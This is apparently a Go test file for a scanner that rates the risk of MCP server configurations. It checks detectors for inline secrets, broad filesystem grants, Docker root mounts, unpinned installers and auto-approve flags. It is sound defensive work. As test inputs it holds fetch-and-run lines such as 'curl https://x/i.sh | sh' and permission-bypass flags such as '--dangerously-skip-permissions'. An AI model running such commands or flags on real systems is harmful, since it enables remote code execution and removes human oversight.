package mcp

import (
	"strings"
	"testing"

	"github.com/orynval/orynval-labs/internal/core"
)

func TestSecretInEnv(t *testing.T) {
	// No env at all → no factor.
	if _, ok := secretInEnv(Server{}); ok {
		t.Error("empty env should not fire")
	}
	// Secret-shaped key with a non-empty value → fires HIGH.
	f, ok := secretInEnv(Server{Env: map[string]string{"GITHUB_TOKEN": "ghp_abcdefghijklmnopqrstuvwxyz012345"}})
	if !ok || f.severity != core.SeverityHigh || f.id != "secret-in-env" {
		t.Fatalf("shaped key should fire HIGH: ok=%v f=%+v", ok, f)
	}
	if strings.Contains(f.detail, "ghp_abcdefghijklmnopqrstuvwxyz012345") {
		t.Error("detail must not contain the raw secret")
	}
	// Non-secret-shaped key but the value itself looks like a secret → fires.
	if _, ok := secretInEnv(Server{Env: map[string]string{"CONFIG": "AKIAIOSFODNN7EXAMPLE"}}); !ok {
		t.Error("secret-looking value should fire even with a benign key")
	}
	// Secret-shaped key with an EMPTY value → does not fire (nothing inline).
	if _, ok := secretInEnv(Server{Env: map[string]string{"API_KEY": ""}}); ok {
		t.Error("empty value for a shaped key should not fire")
	}
	// Benign key and benign value → does not fire.
	if _, ok := secretInEnv(Server{Env: map[string]string{"LOG_LEVEL": "info"}}); ok {
		t.Error("benign env should not fire")
	}
}

func TestFSGrant(t *testing.T) {
	cases := map[string]grant{
		"/":             grantHigh,
		"~":             grantHigh,
		"~/projects":    grantHigh,
		"$HOME":         grantHigh,
		"$HOME/work":    grantHigh,
		"${HOME}/work":  grantHigh,
		"/opt/data":     grantMedium,
		"relative/path": grantNone,
		"--flag":        grantNone,
	}
	for in, want := range cases {
		if got := fsGrant(in); got != want {
			t.Errorf("fsGrant(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestFilesystemScope(t *testing.T) {
	// No granting args.
	if _, ok := filesystemScope(Server{Args: []string{"-y", "pkg"}}); ok {
		t.Error("no filesystem arg should not fire")
	}
	// Root grant → HIGH.
	f, ok := filesystemScope(Server{Args: []string{"-y", "srv", "/"}})
	if !ok || f.severity != core.SeverityHigh {
		t.Fatalf("root grant should be HIGH: ok=%v sev=%v", ok, f.severity)
	}
	// Non-root absolute grant → MEDIUM.
	f, ok = filesystemScope(Server{Args: []string{"/opt/data"}})
	if !ok || f.severity != core.SeverityMedium {
		t.Fatalf("absolute path grant should be MEDIUM: ok=%v sev=%v", ok, f.severity)
	}
	// Mixed: any high arg makes the whole factor HIGH, listing both.
	f, ok = filesystemScope(Server{Args: []string{"/opt/data", "/"}})
	if !ok || f.severity != core.SeverityHigh {
		t.Fatalf("mixed grant should be HIGH: ok=%v sev=%v", ok, f.severity)
	}
	if !strings.Contains(f.detail, "/opt/data") || !strings.Contains(f.detail, "/") {
		t.Errorf("detail should list all granting paths: %q", f.detail)
	}
}

func TestCurlPipeShell(t *testing.T) {
	trueCases := []string{
		"curl https://x/i.sh | sh",
		"curl https://x/i.sh |sh",
		"wget -qo- https://x/i.sh | bash",
		"wget -qo- https://x/i.sh |bash",
	}
	for _, c := range trueCases {
		if !curlPipeShell(c) {
			t.Errorf("curlPipeShell(%q) = false, want true", c)
		}
	}
	falseCases := []string{
		"curl https://x/file -o out", // downloads but does not pipe to a shell
		"node server.js",             // no downloader at all
	}
	for _, c := range falseCases {
		if curlPipeShell(c) {
			t.Errorf("curlPipeShell(%q) = true, want false", c)
		}
	}
}

func TestDockerMountsRoot(t *testing.T) {
	if !dockerMountsRoot([]string{"run", "-v", "/:/host", "img"}) {
		t.Error("root mount should be detected")
	}
	if dockerMountsRoot([]string{"run", "-v", "/opt:/data", "img"}) {
		t.Error("non-root mount should not be detected")
	}
}

func TestAutoApprove(t *testing.T) {
	for _, c := range []string{"agent --yolo", "x --dangerously-skip-permissions", "y --auto-approve", "z --yes-always"} {
		if !autoApprove(c) {
			t.Errorf("autoApprove(%q) = false, want true", c)
		}
	}
	if autoApprove("agent --safe") {
		t.Error("benign flags should not trip autoApprove")
	}
}

func TestPinned(t *testing.T) {
	cases := map[string]bool{
		"@acme/docs-mcp@1.4.2": true,
		"plain-pkg@2.0.0":      true,
		"uv-pkg==1.2.3":        true,
		"@acme/docs-mcp":       false,
		"plain-pkg":            false,
	}
	for in, want := range cases {
		if got := pinned(in); got != want {
			t.Errorf("pinned(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestFirstPackageArg(t *testing.T) {
	if got := firstPackageArg([]string{"-y", "--quiet", "pkg", "extra"}); got != "pkg" {
		t.Errorf("firstPackageArg = %q, want pkg", got)
	}
	if got := firstPackageArg([]string{"-y", "--quiet"}); got != "" {
		t.Errorf("firstPackageArg (all flags) = %q, want empty", got)
	}
	if got := firstPackageArg(nil); got != "" {
		t.Errorf("firstPackageArg(nil) = %q, want empty", got)
	}
}

func TestNpxUnpinned(t *testing.T) {
	if !npxUnpinned([]string{"-y", "unpinned-pkg"}) {
		t.Error("-y unpinned should fire")
	}
	if !npxUnpinned([]string{"--yes", "unpinned-pkg"}) {
		t.Error("--yes unpinned should fire")
	}
	if npxUnpinned([]string{"-y", "pinned@1.0.0"}) {
		t.Error("-y pinned should not fire")
	}
	if npxUnpinned([]string{"pkg"}) {
		t.Error("without -y should not fire")
	}
	if npxUnpinned([]string{"-y"}) {
		t.Error("with -y but no package should not fire")
	}
}

func TestUvxUnpinned(t *testing.T) {
	if !uvxUnpinned([]string{"some-pkg"}) {
		t.Error("uvx unpinned should fire")
	}
	if uvxUnpinned([]string{"some-pkg==1.0"}) {
		t.Error("uvx pinned should not fire")
	}
	if uvxUnpinned([]string{"--quiet"}) {
		t.Error("uvx with no package should not fire")
	}
}

func TestUnpinnedInstaller(t *testing.T) {
	if !unpinnedInstaller(Server{Command: "npx", Args: []string{"-y", "pkg"}}) {
		t.Error("npx unpinned should fire")
	}
	if !unpinnedInstaller(Server{Command: "/usr/bin/uvx", Args: []string{"pkg"}}) {
		t.Error("uvx (abs path) unpinned should fire")
	}
	if unpinnedInstaller(Server{Command: "node", Args: []string{"server.js"}}) {
		t.Error("non-installer command should not fire")
	}
}

func TestRiskyCommand(t *testing.T) {
	// Clean launch → no factor.
	if _, ok := riskyCommand(Server{Command: "node", Args: []string{"server.js"}}); ok {
		t.Error("clean command should not fire")
	}
	// Unpinned installer only → MEDIUM.
	f, ok := riskyCommand(Server{Command: "npx", Args: []string{"-y", "unpinned"}})
	if !ok || f.severity != core.SeverityMedium {
		t.Fatalf("unpinned installer should be MEDIUM: ok=%v sev=%v", ok, f.severity)
	}
	// Each HIGH pattern.
	highCases := []Server{
		{Command: "sh", Args: []string{"-c", "curl https://x/i.sh | sh"}},
		{Command: "docker", Args: []string{"run", "--privileged", "img"}},
		{Command: "docker", Args: []string{"run", "-v", "/:/host", "img"}},
		{Command: "agent", Args: []string{"--dangerously-skip-permissions"}},
	}
	for _, s := range highCases {
		f, ok := riskyCommand(s)
		if !ok || f.severity != core.SeverityHigh {
			t.Errorf("expected HIGH for %+v: ok=%v sev=%v", s, ok, f.severity)
		}
	}
	// Combined high + unpinned still HIGH, and detail lists multiple reasons.
	f, ok = riskyCommand(Server{Command: "npx", Args: []string{"-y", "unpinned", "--yolo"}})
	if !ok || f.severity != core.SeverityHigh {
		t.Fatalf("combined should be HIGH: ok=%v sev=%v", ok, f.severity)
	}
	if !strings.Contains(f.detail, ";") {
		t.Errorf("combined detail should list multiple reasons: %q", f.detail)
	}
}

func TestRemoteEndpoint(t *testing.T) {
	if _, ok := remoteEndpoint(Server{Command: "node"}); ok {
		t.Error("a stdio server (no url) should not fire remote-endpoint")
	}
	f, ok := remoteEndpoint(Server{URL: "https://api.example.com/sse"})
	if !ok || f.severity != core.SeverityMedium {
		t.Fatalf("url server should fire MEDIUM: ok=%v sev=%v", ok, f.severity)
	}
	if !strings.Contains(f.detail, "api.example.com") {
		t.Errorf("detail should name the host: %q", f.detail)
	}
}

func TestBaselineFactor(t *testing.T) {
	b := Baseline{Servers: map[string]string{"known": "sig-known"}}
	// Unknown server name → unapproved (inferred, MEDIUM).
	f, ok := baselineFactor(Server{Name: "new"}, b)
	if !ok || f.id != "unapproved-server" || f.severity != core.SeverityMedium || f.kind != core.KindInferred {
		t.Fatalf("unknown server should be unapproved/inferred/medium: ok=%v f=%+v", ok, f)
	}
	// Known name, differing signature → drift (observed, HIGH).
	f, ok = baselineFactor(Server{Name: "known", Signature: "sig-changed"}, b)
	if !ok || f.id != "baseline-drift" || f.severity != core.SeverityHigh || f.kind != core.KindObserved {
		t.Fatalf("changed signature should be drift/observed/high: ok=%v f=%+v", ok, f)
	}
	// Known name, matching signature → no factor.
	if _, ok := baselineFactor(Server{Name: "known", Signature: "sig-known"}, b); ok {
		t.Error("matching signature should not fire")
	}
}

func TestShortSig(t *testing.T) {
	if got := shortSig("abcdef0123456789"); got != "abcdef012345" {
		t.Errorf("shortSig long = %q", got)
	}
	if got := shortSig("short"); got != "short" {
		t.Errorf("shortSig short = %q", got)
	}
}

func TestDetectFactorsSkipsBaselineWhenAbsent(t *testing.T) {
	s := Server{Name: "x", Command: "node", Args: []string{"s.js"}}
	// With no baseline, a clean server yields zero factors (no unapproved noise).
	if fs := detectFactors(s, Baseline{}, false); len(fs) != 0 {
		t.Errorf("no-baseline clean server should have 0 factors, got %+v", fs)
	}
	// With a baseline present, the same clean server is flagged unapproved.
	fs := detectFactors(s, Baseline{Servers: map[string]string{}}, true)
	if len(fs) != 1 || fs[0].id != "unapproved-server" {
		t.Errorf("baseline-present clean server should be unapproved, got %+v", fs)
	}
}
